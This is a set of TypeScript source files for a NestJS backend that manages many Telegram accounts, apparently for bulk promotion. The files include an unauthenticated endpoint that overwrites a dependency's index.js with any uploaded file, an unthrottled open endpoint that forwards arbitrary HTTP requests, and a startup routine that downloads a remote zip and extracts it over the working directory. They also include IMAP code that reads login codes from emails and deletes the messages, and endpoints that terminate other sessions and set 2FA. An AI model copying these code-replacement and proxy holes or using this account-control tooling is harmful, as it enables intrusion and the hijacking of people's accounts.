(err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, UploadedFile, UseInterceptors, Body, HttpException, ValidationPipe } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { FileInterceptor } from '@nestjs/platform-express';\r\nimport { ApiOperation, ApiConsumes, ApiBody } from '@nestjs/swagger';\r\nimport { existsSync, mkdirSync, promises as fs } from 'fs';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\nimport { join } from 'path';\r\nimport { CloudinaryService } from './cloudinary';\r\nimport axios, { AxiosResponse } from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\n\r\ninterface RequestResponse {\r\n    status: number;\r\n    statusText: string;\r\n    headers: Record<string, any>;\r\n    data: any;\r\n}\r\n\r\n@Controller()\r\nexport class AppController {\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('updateCommonService')\r\n    @UseInterceptors(\r\n        FileInterceptor('file', {\r\n            storage: diskStorage({\r\n                destination: (req, file, cb) => {\r\n                    try {\r\n                        const folderPath = join(__dirname, '..', 'uploads');\r\n                        if (!existsSync(folderPath)) {\r\n                            mkdirSync(folderPath, { recursive: true });\r\n                        }\r\n                        cb(null, folderPath);\r\n                    } catch (error) {\r\n                        cb(error, null);\r\n                    }\r\n                },\r\n                filename: (req, file, cb) => {\r\n                    cb(null, 'index.js');\r\n                },\r\n            }),\r\n        }),\r\n    )\r\n    @ApiOperation({ summary: 'Upload a file to update commonService index.js' })\r\n    @ApiConsumes('multipart/form-data')\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                file: { type: 'string', format: 'binary' },\r\n            },\r\n        },\r\n    })\r\n    async uploadFileAndUpdate(@UploadedFile() file: MulterFile): Promise<{ message: string }> {\r\n        try {\r\n            const targetDir = join(__dirname, '..', 'node_modules', 'commonService', 'dist');\r\n            const filePath = join(targetDir, 'index.js');\r\n\r\n            // Ensure the target directory exists\r\n            if (!existsSync(targetDir)) {\r\n                mkdirSync(targetDir, { recursive: true });\r\n            }\r\n\r\n            // Read the uploaded file\r\n            const fileBuffer = await fs.readFile(file.path);\r\n\r\n            // Write to the target location\r\n            await fs.writeFile(filePath, fileBuffer);\r\n\r\n            console.log('commonService/index.js updated successfully.');\r\n            return { message: 'commonService/index.js updated successfully' };\r\n        } catch (error) {\r\n            console.error('Failed to update commonService/index.js:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    @Post('execute-request')\r\n    @ApiOperation({ summary: 'Execute an HTTP request with given details' })\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            required: ['url'],\r\n            properties: {\r\n                url: { type: 'string', description: 'The URL to send the request to' },\r\n                method: { type: 'string', enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'], default: 'GET' },\r\n                headers: { type: 'object', additionalProperties: { type: 'string' } },\r\n                data: { type: 'object', description: 'Request body data' },\r\n                params: { type: 'object', additionalProperties: { type: 'string' } }\r\n            }\r\n        }\r\n    })\r\n    async executeRequest(@Body(new ValidationPipe({ transform: true })) requestDetails: ExecuteRequestDto): Promise<RequestResponse> {\r\n        try {\r\n            const { url, method = 'GET', headers = {}, data, params } = requestDetails;\r\n            \r\n            const response: AxiosResponse = await axios({\r\n                url,\r\n                method,\r\n                headers,\r\n                data,\r\n                params,\r\n                validateStatus: () => true // This ensures axios doesn't throw error for non-2xx responses\r\n            });\r\n\r\n            return response.data;\r\n        } catch (error) {\r\n            throw new HttpException({\r\n                message: 'Failed to execute request',\r\n                error: error.message\r\n            }, 500);\r\n        }\r\n    }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule, RequestMethod } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\nimport { ThrottleMiddleware } from './middlewares/throttle.middleware';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n    consumer.apply(ThrottleMiddleware).exclude({ path: 'execute-request', method: RequestMethod.ALL }).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\nimport { promises as fs } from 'fs';\nimport { join } from 'path';\nimport { diskStorage, File as MulterFile } from 'multer';\n\n@Injectable()\nexport class AppService {\n  getHello(): string {\n    return 'Hello World!';\n  }\n}\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\n    MongooseModule.forRootAsync({\n      useFactory: () => ({\n        uri: process.env.mongouri,\n      }),\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigModule, MongooseModule],\n})\nexport class initModule implements OnModuleDestroy, OnModuleInit {\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\n  async onModuleInit() {\n    console.log(`Started :: ${process.env.clientId}`)\n    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\n  }\n\n  async onModuleDestroy() {\n    console.log(\"Init Module Destroying\")\n    await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\n    this.closeConnection();\n  }\n\n  private closeConnection() {\n    console.log(\"Closing mongoose connection\")\n    this.connection.close(true)\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { CloudinaryService } from '../../cloudinary';\n\n@Injectable()\nexport class ConfigurationService {\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\n        this.setEnv()\n     }\n\n    async OnModuleInit() {\n       console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.configurationModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return user;\n    }\n\n    async setEnv() {\n        console.log(\"Setting Envs\");\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\n        const data = {...configuration}\n        for (const key in data) {\n            console.log('setting', key)\n            process.env[key] = data[key];\n        }\n        console.log(\"finished setting env\");\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, UsePipes, ValidationPipe, Delete, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\nimport { Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    MediaSearchDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    UpdateProfileDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType\n} from './dto';\nimport { MessageType } from './dto/message-search.dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from 'src/interfaces/telegram';\nimport { ConnectionStatusDto } from './dto/common-responses.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\n@UsePipes(new ValidationPipe({\n    transform: true,\n    whitelist: true,\n    forbidNonWhitelisted: true\n}))\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) {}\n\n    private async handleTelegramOperation<T>(operation: () => Promise<T>): Promise<T> {\n        try {\n            return await operation();\n        } catch (error) {\n            if (error instanceof BadRequestException) {\n                throw error;\n            }\n            throw new BadRequestException(error.message || 'Telegram operation failed');\n        }\n    }\n\n    // Connection Management\n    @Post('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully connected' })\n    @ApiResponse({ status: 400, description: 'Connection failed' })\n    async connect(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(() =>\n            this.telegramService.createClient(mobile)\n        );\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully disconnected' })\n    async disconnect(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.deleteClient(mobile);\n        });\n    }\n\n    @Post('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ status: 200, description: 'All clients disconnected successfully' })\n    async disconnectAllClients() {\n        return this.handleTelegramOperation(() =>\n            this.telegramService.disconnectAll()\n        );\n    }\n    // Profile Management\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Profile retrieved successfully' })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMe(mobile);\n        });\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ status: 200, description: 'Entity retrieved successfully' })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getEntity(mobile, entity);\n        });\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    async updateProfile(\n        @Param('mobile') mobile: string,\n        @Body() updateProfileDto: UpdateProfileDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateNameandBio(\n                mobile,\n                updateProfileDto.firstName,\n                updateProfileDto.about\n            );\n        });\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    async setProfilePhoto(\n        @Param('mobile') mobile: string,\n        @Body() photoDto: ProfilePhotoDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.setProfilePic(mobile, photoDto.name);\n        });\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.deleteProfilePhotos(mobile);\n        });\n    }\n\n    // Message Operations\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessages(mobile, chatId, limit);\n        });\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardMessage(\n        @Param('mobile') mobile: string,\n        @Body() forwardDto: ForwardBatchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.forwardBulkMessages(\n                mobile,\n                forwardDto.fromChatId,\n                forwardDto.toChatId,\n                forwardDto.messageIds\n            );\n        });\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    async processBatchMessages(\n        @Param('mobile') mobile: string,\n        @Body() batchOp: BatchProcessDto\n    ) {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(\n                                    mobile,\n                                    item.toChatId,\n                                    item.fromChatId,\n                                    item.messageId\n                                );\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, item.chatId);\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Post('messages/bulk-forward/:mobile')\n    @ApiOperation({ summary: 'Forward multiple messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardBulkMessages(\n        @Param('mobile') mobile: string,\n        @Body() bulkOp: ForwardBatchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.forwardBulkMessages(\n                mobile,\n                bulkOp.fromChatId,\n                bulkOp.toChatId,\n                bulkOp.messageIds\n            );\n        });\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({ summary: 'Search messages in a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'query', required: true })\n    @ApiQuery({ name: 'types', required: false, enum: MessageType, isArray: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async searchMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('query') query: string,\n        @Query('types') types?: MessageType[],\n        @Query('offset') offset?: number,\n        @Query('limit') limit: number = 20\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.searchMessages(mobile, { chatId, query, types, offset, limit });\n        });\n    }\n\n    // Channel Operations\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    async getChannelInfo(\n        @Param('mobile') mobile: string,\n        @Query('includeIds') includeIds?: boolean\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChannelInfo(mobile, includeIds);\n        });\n    }\n\n    @Post('channels/join/:mobile')\n    @ApiOperation({ summary: 'Join channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'channel', description: 'Channel username or ID', required: true })\n    @ApiQuery({ name: 'forward', description: 'Whether to forward messages after joining', required: false, type: Boolean })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    async joinChannel(\n        @Param('mobile') mobile: string,\n        @Param('channel') channel: string,\n        @Query('forward') forward?: boolean,\n        @Query('fromChatId') fromChatId?: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            if (forward && fromChatId) {\n                return this.telegramService.joinChannelAndForward(\n                    mobile,\n                    fromChatId,\n                    channel\n                );\n            }\n            return this.telegramService.joinChannel(mobile, channel);\n        });\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    async leaveChannel(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.leaveChannel(mobile, channel);\n        });\n    }\n\n    // Security & Privacy\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.set2Fa(mobile);\n        });\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updatePrivacy(mobile);\n        });\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    async updatePrivacyBatch(\n        @Param('mobile') mobile: string,\n        @Body() settings: PrivacySettingsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updatePrivacyBatch(mobile, settings);\n        });\n    }\n\n    // Session Management\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Active sessions retrieved successfully' })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getAuths(mobile);\n        });\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Other sessions terminated successfully' })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.removeOtherAuths(mobile);\n        });\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'New session created successfully' })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createNewSession(mobile);\n        });\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await 